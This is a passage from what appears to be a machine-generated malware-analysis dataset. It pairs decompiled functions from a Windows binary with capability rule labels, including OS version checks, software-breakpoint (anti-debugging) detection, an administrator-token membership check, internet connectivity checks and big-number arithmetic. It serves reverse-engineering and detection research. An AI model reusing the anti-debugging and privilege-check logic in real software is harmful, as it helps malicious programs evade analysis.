fcn.0040b00a(*0x41b13c);\n        fcn.0040b186(uVar5);\n        if (((uVar7 | 0x6f) < 1) || (*0x41e3fd < uVar7)) {\n            fcn.0040b261(uVar5);\n        }\n    }\n    else if (uVar7 <= *0x41e3fd) {\n        fcn.0040afe7();\n    }\n    *(unaff_ESI + 0x100) = var_1h;\n    *0x41e3fd = (*0x41b13c * 0xd4 | *0x41e3fd) != 0;\n    *(unaff_ESI + 0x101) = var_2h;\n    fcn.0040b00a(0x4421);\n    fcn.0040b186(*0x41b036);\n    fcn.0040b00a(*0x41b13c);\n    return;\n}\n",
        "token_count": 1243
    },
    "0040bb38": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0040bb38(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint lpVersionInformation;\n    uint32_t s;\n    uint SidToCheck;\n    int32_t var_14h;\n    uint IsMember;\n    uint cbSid;\n    uint ExistingTokenHandle;\n    int32_t DuplicateTokenHandle;\n    \n    IsMember = 0;\n    ExistingTokenHandle = 0;\n    DuplicateTokenHandle = 0;\n    cbSid = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(10, &ExistingTokenHandle);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    if (iVar3 != 0) {\n        lpVersionInformation = 0x114;\n        sub.ntdll.dll_memset(&s, 0, 0x110);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n        if (iVar3 != 0) {\n            if (5 < s) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(ExistingTokenHandle, 0x12, &var_14h, 4, &cbSid);\n                if (iVar3 == 0) goto code_r0x0040bc24;\n                if (var_14h == 3) {\n                    iVar3 = (*pcVar1)(ExistingTokenHandle, 0x13, &DuplicateTokenHandle, 4, &cbSid);\n                    if (iVar3 == 0) goto code_r0x0040bc24;\n                }\n            }\n            if (DuplicateTokenHandle == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(ExistingTokenHandle, 1, &DuplicateTokenHandle);\n                if (iVar3 == 0) goto code_r0x0040bc24;\n            }\n            cbSid = 0x44;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x1a, 0, &SidToCheck, &cbSid);\n            if (iVar3 != 0) {\n                (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(DuplicateTokenHandle, &SidToCheck, &IsMember);\n            }\n        }\n    }\ncode_r0x0040bc24:\n    fcn.0040c13c();\n    fcn.0040c13c();\n    return IsMember;\n}\n",
        "token_count": 560
    },
    "0040ddaa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040ddaa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint32_t arg_28h)\n\n{\n    uint arg_10h_00;\n    uint uVar1;\n    uchar *arg_10h_01;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.004111b4();\n    uVar1 = fcn.004111b4();\n    var_10h = uVar1;\n    var_4h = fcn.004111b4();\n    var_ch = fcn.004111b4();\n    arg_10h_01 = fcn.0040ae05(0);\n    if (arg_10h_01 == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        *arg_10h_01 = 1;\n        fcn.0040dc4a(arg_14h, arg_28h - (arg_28h >> 1), arg_10h_01);\n        *arg_10h_01 = 0xff;\n        fcn.0040dc4a(arg_18h, arg_28h >> 1, arg_10h_01);\n        fcn.0041131f();\n        iVar2 = fcn.0041133c();\n        if (iVar2 < 1) {\n            fcn.0041137d();\n            fcn.0041137d();\n            fcn.0041137d();\n        }\n        fcn.0041137d();\n        fcn.004113e6(uVar1);\n        fcn.0041137d();\n        fcn.004113e6(var_4h);\n        fcn.004116b0(var_8h, uVar1);\n        fcn.004116b0(var_8h, var_4h);\n        fcn.00411474(arg_14h, arg_18h);\n        arg_10h_00 = var_ch;\n        fcn.00411474(uVar1, var_4h);\n        fcn.00411644(arg_10h, arg_ch);\n        fcn.004115ca(arg_ch, arg_10h, arg_10h_00);\n        fcn.00411644(arg_1ch, arg_ch);\n        fcn.00411644(arg_20h, arg_ch);\n        fcn.00411644(arg_24h, arg_18h);\n        fcn.0040af12();\n        fcn.004111e1(&var_8h);\n        fcn.004111e1(&var_10h);\n        fcn.004111e1(&var_4h);\n        fcn.004111e1(&var_ch);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 670
    },
    "0040e1c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0040e1c6(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t *unaff_ESI;\n    \n    uVar2 = 0;\n    uVar1 = fcn.0040f84a();\n    if (uVar1 == '\\0') goto code_r0x0040e1f3;\n    uVar1 = *unaff_ESI;\n    if (uVar1 != 1) {\n        if (uVar1 != 2) goto code_r0x0040e1f3;\n        uVar1 = fcn.0040f84a();\n        if (uVar1 == '\\0') goto code_r0x0040e1f3;\n    }\n    uVar2 = 1;\ncode_r0x0040e1f3:\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 204
    },
    "0040e1f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e1f7(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t arg_14h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s2;\n    \n    piVar1 = *0x41c6ac;\n    uVar5 = *0x41c68c;\n    cVar2 = fcn.0040e1c6();\n    if (((cVar2 == '\\0') || (cVar2 = fcn.0040f84a(arg_8h, uVar5),  cVar2 == '\\0')) ||\n       (cVar2 = fcn.0040f871(arg_ch, 4),  cVar2 == '\\0')) {\n        var_10h = 0;\n    }\n    else {\n        if (*piVar1 == 2) {\n            var_14h = piVar1[3];\n            var_ch = piVar1[1];\n        }\n        else {\n            var_14h = piVar1[2];\n            var_ch = piVar1[1];\n        }\n        iVar3 = fcn.004137b1();\n        arg_14h = iVar3 + 7U >> 3;\n        uVar4 = arg_14h;\n        if (arg_14h <= uVar5) {\n            uVar4 = uVar5;\n        }\n        if (uVar4 % arg_14h == 0) {\n            var_10h = arg_14h;\n            if (arg_14h <= uVar5) {\n                var_10h = uVar5;\n            }\n        }\n        else {\n            uVar4 = arg_14h;\n            if (arg_14h <= uVar5) {\n                uVar4 = uVar5;\n            }\n            var_10h = (uVar4 / arg_14h + 1) * arg_14h;\n        }\n        iVar3 = fcn.0040ae05(0);\n        if (iVar3 != 0) {\n            var_1ch = fcn.004111b4();\n            var_20h = fcn.004111b4();\n            s2 = arg_8h;\n            var_8h = iVar3;\n            if (arg_14h <= uVar5) {\n                do {\n                    fcn.0040e17d(var_1ch, var_14h, s2, arg_14h, var_8h);\n                    s2 = s2 + arg_14h;\n                    var_8h = var_8h + arg_14h;\n                    uVar5 = uVar5 - arg_14h;\n                } while (arg_14h <= uVar5);\n            }\n            if ((uVar5 != 0) && (var_18h = fcn.0040ae05(0),  var_18h != 0)) {\n                sub.ntdll.dll_memcpy(var_18h, s2, uVar5);\n                fcn.0040f161(var_18h + uVar5);\n                fcn.0040e17d(var_1ch, var_14h, var_18h, arg_14h, var_8h);\n                fcn.0040af58();\n            }\n            *arg_ch = iVar3;\n            fcn.004111e1(&var_1ch);\n            fcn.004111e1(&var_20h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 857
    },
    "0040e375": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040e375(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint unaff_ESI;\n    \n    cVar1 = fcn.0040e1c6();\n    if (cVar1 != '\\0') {\n        if (*in_EAX == 2) {\n            fcn.004111e1(in_EAX + 1);\n            fcn.004111e1(in_EAX + 2);\n            fcn.004111e1(in_EAX + 3);\n        }\n        else if (*in_EAX == 1) {\n            fcn.004111e1(in_EAX + 1);\n            fcn.004111e1(in_EAX + 2);\n        }\n        cVar1 = fcn.0040acf9(unaff_ESI);\n        if (cVar1 != '\\0') {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            cVar1 = fcn.0040ad0b(in_EAX);\n            if (cVar1 != '\\0') {\n                sub.ntdll.dll_memset();\n                fcn.0040af12();\n            }\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "0040e4eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * fcn.0040e4eb(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = NULL;\n    uVar3 = *(param_1 + 8) + 7U >> 3;\n    if (*(param_1 + 0xc) == 1) {\n        if (param_2 == uVar3 * 2 + 0x10) {\n            puVar4 = fcn.0040ae05(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                uVar1 = fcn.004111b4();\n                puVar4[1] = uVar1;\n                fcn.004112a9(param_1 + 0x10, uVar3);\n                uVar1 = fcn.004111b4();\n                puVar4[2] = uVar1;\n                fcn.004112a9(param_1 + 0x10 + uVar3, uVar3);\n            }\n        }\n    }\n    else if ((*(param_1 + 0xc) == 2) && (param_2 == uVar3 * 3 + 0x10)) {\n        puVar4 = fcn.0040ae05(8);\n        if (puVar4 != NULL) {\n            *puVar4 = 2;\n            uVar1 = fcn.004111b4();\n            puVar4[1] = uVar1;\n            fcn.004112a9(param_1 + 0x10, uVar3);\n            iVar2 = param_1 + 0x10 + uVar3;\n            uVar1 = fcn.004111b4();\n            puVar4[2] = uVar1;\n            fcn.004112a9(iVar2, uVar3);\n            uVar1 = fcn.004111b4();\n            puVar4[3] = uVar1;\n            fcn.004112a9(iVar2 + uVar3, uVar3);\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 485
    },
    "0041027f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0041027f(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t *in_EAX;\n    char extraout_CL;\n    char cVar5;\n    char *pcVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint var_124h;\n    int32_t var_20h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_5h;\n    \n    if ((in_EAX[1] & 1U) != 0) {\n        in_EAX[1] = in_EAX[1] & 0xfffffffb;\n    }\n    iVar2 = *in_EAX;\n    if (iVar2 < 1) {\n        return 0;\n    }\n    if (iVar2 < 3) {\n        in_EAX[3] = 1;\n        return 1;\n    }\n    if (iVar2 == 3) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7) != '\\0')); uVar7 = uVar7 + 1) {\n        }\ncode_r0x00410409:\n        in_EAX[3] = uVar7;\n        return uVar7;\n    }\n    if (iVar2 == 4) {\n        if (arg_ch == 0) {\n            return 0;\n        }\n        for (uVar7 = 0; ((in_EAX[3] == 0 || (uVar7 < in_EAX[3])) && (*(arg_ch + uVar7 * 2) != 0)); uVar7 = uVar7 + 1) {\n        }\n        goto code_r0x00410409;\n    }\n    if (3 < iVar2 - 5U) {\n        return 0;\n    }\n    var_5h._0_1_ = ~*(in_EAX + 1) & 0x20 | 7;\n    var_10h = 10;\n    if (iVar2 == 7) {\n        var_10h = 0x10;\n    }\n    else if (iVar2 == 8) {\n        var_10h = 8;\n    }\n    var_ch = &var_124h;\n    pcVar6 = arg_8h;\n    if (iVar2 != 5) goto code_r0x00410359;\n    if (arg_10h < 1) {\n        if (arg_10h < 0) {\n            *arg_8h = '-';\n            goto code_r0x00410348;\n        }\n        if (-1 < arg_10h) {\n            if ((0 < arg_10h) || (arg_ch != 0)) goto code_r0x0041032d;\n            goto code_r0x00410349;\n        }\n    }\n    else {\ncode_r0x0041032d:\n        if ((in_EAX[1] & 0x200U) == 0) {\n            if ((in_EAX[1] & 0x400U) != 0) {\n                *arg_8h = ' ';\n                goto code_r0x00410348;\n            }\n        }\n        else {\n            *arg_8h = '+';\ncode_r0x00410348:\n            pcVar6 = arg_8h + 1;\n        }\ncode_r0x00410349:\n        if ((0 < arg_10h) || (-1 < arg_10h)) goto code_r0x00410359;\n    }\n    arg_ch = -arg_ch;\ncode_r0x00410359:\n    var_14h = in_EAX[1];\n    var_18h = 0;\n    do {\n        iVar8 = sub.ntdll.dll__aulldvrm();\n        cVar5 = extraout_CL + '0';\n        if ('9' < cVar5) {\n            cVar5 = cVar5 + var_5h;\n        }\n        var_20h = arg_ch;\n        puVar4 = var_ch + 1;\n        *var_ch = cVar5;\n        var_ch = puVar4;\n        arg_ch = iVar8;\n    } while (iVar8 != 0);\n    while (&var_124h < var_ch) {\n        var_ch = var_ch + -1;\n        *pcVar6 = *var_ch;\n        pcVar6 = pcVar6 + 1;\n    }\n    *pcVar6 = '\\0';\n    uVar7 = pcVar6 - arg_8h;\n    puVar1 = in_EAX + 3;\n    if (*puVar1 < uVar7) {\n        *puVar1 = uVar7;\n    }\n    if ((var_14h & 4) == 0) {\n        return uVar7;\n    }\n    uVar3 = in_EAX[2];\n    if (uVar3 < *puVar1 || uVar3 == *puVar1) {\n        return uVar7;\n    }\n    *puVar1 = uVar3;\n    return uVar7;\n}\n",
        "token_count": 1204
    },
    "004113a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004113a0(uint *param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = param_1[1];\n    if (uVar2 < 2) {\n        uVar2 = 1;\n    }\n    fcn.00411219(uVar2 + 1);\n    iVar1 = fcn.004139da(*param_1, uVar2);\n    if (iVar1 == 0) {\n        in_EAX[1] = uVar2;\n    }\n    else {\n        *(*in_EAX + uVar2 * 4) = iVar1;\n        in_EAX[1] = uVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "004113e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004113e6(uint *param_1)\n\n{\n    int32_t in_EAX;\n    uint32_t n;\n    \n    n = param_1[1];\n    if (n < 2) {\n        n = 1;\n    }\n    fcn.00411219(n);\n    fcn.00413a11(*param_1);\n    *(in_EAX + 4) = n;\n    return;\n}\n",
        "token_count": 95
    },
    "00411474": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411474(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t n;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    uVar1 = arg_ch[1];\n    if (uVar1 == 1) {\n        uVar2 = fcn.00411414(arg_8h, **arg_ch);\n    }\n    else {\n        n = arg_8h[1];\n        if (arg_8h[1] <= uVar1) {\n            n = uVar1;\n        }\n        fcn.00411219(n);\n        fcn.00411219(n);\n        fcn.00411219(n * 2);\n        fcn.0041326c(*arg_8h, *arg_ch, n);\n        uVar2 = fcn.0041379d(*unaff_ESI);\n        unaff_ESI[1] = uVar2;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 238
    },
    "0041208a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041208a(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iStack4;\n    \n    if (*0x41e404 == 1) {\n        iStack4 = 0;\n        if (0 < param_2) {\n            do {\n                puVar1 = param_1 + iStack4 * 8;\n                uVar3 = puVar1[1];\n                uVar4 = uVar3 << 0x10;\n                uVar2 = uVar3 >> 0x10 ^ uVar4;\n                uVar3 = (*puVar1 ^ uVar3) >> 0x10 ^ (*puVar1 << 0x10 | uVar3 >> 0x10);\n                iStack4 = iStack4 + 1;\n                *puVar1 = (uVar2 >> 8 ^ uVar2 << 8) & 0xff00ff ^ uVar2 << 8;\n                puVar1[1] = (uVar3 >> 8 ^ (uVar3 << 8 | uVar4 >> 0x18)) & 0xff00ff ^ (uVar3 << 8 | uVar4 >> 0x18);\n            } while (iStack4 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "00412833": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00412833(void)\n\n{\n    fcn.0040ae05(0);\n    return;\n}\n",
        "token_count": 26
    },
    "0041286e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041286e(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((2 < (*0x41b038 & 0x4c)) || (in_ECX < *0x41b038)) &&\n       ((arg_8h < *0x41b038 >> 0xf || (*0x41b038 + -0xab != in_ECX)))) {\n        return 0x2fcb;\n    }\n    return CONCAT44(in_ECX, in_ECX);\n}\n",
        "token_count": 133
    },
    "00413817": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413817(uint param_1, uint *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (1 < in_EAX) {\n        puVar2 = param_2 + 1;\n        for (iVar1 = in_EAX - 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    *param_2 = 1;\n    return;\n}\n",
        "token_count": 134
    },
    "004139da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004139da(uint32_t param_1, uint32_t *param_2, int32_t *param_3, uint32_t param_4)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = *param_3 + param_1 < param_1;\n    *param_2 = *param_3 + param_1;\n    if (1 < param_4) {\n        puVar1 = param_2 + 1;\n        iVar3 = param_4 - 1;\n        do {\n            uVar2 = *((param_3 - param_2) + puVar1) + bVar4;\n            bVar4 = uVar2 < bVar4;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00413a11": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413a11(uint param_1, uint32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t in_EAX;\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    bVar4 = 0xfffffffe < *param_3 - 1U;\n    *param_2 = *param_3 - 1U;\n    if (1 < in_EAX) {\n        puVar1 = param_2 + 1;\n        iVar3 = in_EAX - 1;\n        do {\n            uVar2 = *((param_3 - param_2) + puVar1) - bVar4;\n            bVar4 = -bVar4 - 1 < uVar2;\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00414368": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414368(uint32_t param_1)\n\n{\n    uchar uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t var_4h;\n    \n    if (in_EAX < 3) {\n        return 2;\n    }\n    var_4h = param_1;\n    do {\n        uVar3 = 0;\n        do {\n            uVar1 = fcn.0040c985();\n            *(&var_4h + uVar3) = uVar1;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 4);\n        uVar3 = 0x80000000;\n        iVar2 = 0x20;\n        do {\n            if ((in_EAX - 2 & uVar3) != 0) break;\n            iVar2 = iVar2 + -1;\n            uVar3 = uVar3 >> 1;\n        } while (0 < iVar2);\n        if (iVar2 < 0x20) {\n            uVar3 = uVar3 * 2 - 1;\n        }\n        else {\n            uVar3 = 0xffffffff;\n        }\n        var_4h = var_4h & uVar3;\n        if (var_4h <= in_EAX - 2) {\n            return var_4h + 2;\n        }\n    } while( true );\n}\n",
        "token_count": 322
    },
    "004143c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004143c4(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t arg_ch_00;\n    int32_t unaff_ESI;\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00412833();\n    arg_8h_01 = fcn.00412833();\n    arg_ch_00 = fcn.00412833();\n    uVar2 = fcn.0041379d(arg_10h);\n    iVar1 = uVar2;\n    if (iVar1 == 0) {\n        fcn.00413817();\n    }\n    else {\n        var_8h = 0x80000000;\n        do {\n            if ((var_8h & *((uVar2 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n            var_8h = var_8h >> 1;\n        } while (var_8h != 0);\n        if (var_8h == 1) {\n            var_8h = 0x80000000;\n            iVar1 = iVar1 + -1;\n        }\n        else {\n            var_8h = var_8h >> 1;\n        }\n        fcn.004137e3(arg_ch);\n        if (iVar1 != 0) {\n            var_14h = arg_10h + -4 + iVar1 * 4;\n            do {\n                fcn.004135d9(arg_8h_00, arg_ch_00, unaff_ESI);\n                fcn.00413339(arg_8h_01, arg_ch_00, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                if ((*var_14h & var_8h) != 0) {\n                    fcn.0041326c(arg_ch, arg_ch_00, unaff_ESI);\n                    fcn.00413339(arg_8h_01, arg_ch_00, arg_8h_00, unaff_ESI * 2, arg_14h, unaff_ESI);\n                }\n                if (var_8h == 1) {\n                    iVar1 = iVar1 + -1;\n                    var_14h = var_14h + -1;\n                    var_8h = 0x80000000;\n                }\n                else {\n                    var_8h = var_8h >> 1;\n                }\n            } while (iVar1 != 0);\n        }\n        fcn.004137e3(arg_ch_00);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_01 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_ch_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return 0;\n}\n",
        "token_count": 746
    },
    "004155c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.004155c2(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint pllRet;\n    uint var_4h;\n    \n    pllRet = 0;\n    var_4h = 0;\n    cVar2 = fcn.004152ab();\n    if (cVar2 != '\\0') {\n        iVar1 = *(in_EAX + 0x14);\n        if (iVar1 == 0) {\n            var_4h = 0;\n            if (*(in_EAX + 0x20) == '\\0') {\n                pllRet = 0;\n            }\n            else {\n                pllRet = 1;\n            }\n        }\n        else if (iVar1 == 2) {\n            pllRet = *(in_EAX + 0x20);\n            var_4h = *(in_EAX + 0x24);\n        }\n        else if (iVar1 == 3) {\n            (*_sym.imp.SHLWAPI.dll_StrToInt64ExA)(*(in_EAX + 0x20), 0, &pllRet);\n        }\n    }\n    return CONCAT44(var_4h, pllRet);\n}\n",
        "token_count": 262
    },
    "00415629": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.00415629(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    uint arg_ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    var_4h = 0;\n    cVar2 = fcn.004152ab();\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    if (*(unaff_EDI + 0x14) != 3) {\n        fcn.0040af12();\n        *(unaff_EDI + 0x28) = 0;\n    }\n    iVar1 = *(unaff_EDI + 0x14);\n    if (iVar1 == 0) {\n        if (*(unaff_EDI + 0x20) == '\\0') {\n            arg_10h = 0xb3fb6ec8;\n            arg_ch = 5;\n            uVar3 = 0x41904c;\n        }\n        else {\n            arg_10h = 0x8cc86c9f;\n            arg_ch = 4;\n            uVar3 = 0x419044;\n        }\n    }\n    else {\n        if (iVar1 == 2) {\n            uVar3 = fcn.0040a88f(0x419054, 5, 0xb4e125eb, 0);\n            fcn.0040bf4f(uVar3, *(unaff_EDI + 0x20));\n            goto code_r0x0041568c;\n        }\n        if (iVar1 != 1) {\n            if (iVar1 != 3) {\n                return 0;\n            }\n            return *(unaff_EDI + 0x20);\n        }\n        arg_10h = 0xcf63b0aa;\n        arg_ch = 4;\n        uVar3 = 0x41905c;\n    }\n    uVar3 = fcn.0040a88f(uVar3, arg_ch, arg_10h, 0);\n    var_4h = fcn.0040bd6e(uVar3);\ncode_r0x0041568c:\n    *(unaff_EDI + 0x28) = var_4h;\n    return var_4h;\n}\n",
        "token_count": 504
    },
    "0040143f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
